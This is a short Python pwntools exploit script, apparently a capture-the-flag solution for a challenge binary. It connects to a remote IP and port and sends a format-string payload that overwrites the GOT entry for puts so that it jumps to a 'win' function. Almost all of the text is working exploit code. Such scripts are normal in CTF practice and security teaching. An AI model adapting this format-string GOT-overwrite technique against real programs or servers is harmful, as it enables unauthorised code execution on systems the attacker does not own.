#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("178.128.29.224", 9476)

    return r


def main():
    r = conn()
    offset = 6
    payload = fmtstr_payload(offset,{exe.got['puts']: exe.sym['win']},write_size='short')
    write("payload",payload)
    r.sendline(payload)
    # good luck pwning :)

    print(r.recvall())


if __name__ == "__main__":
    main()
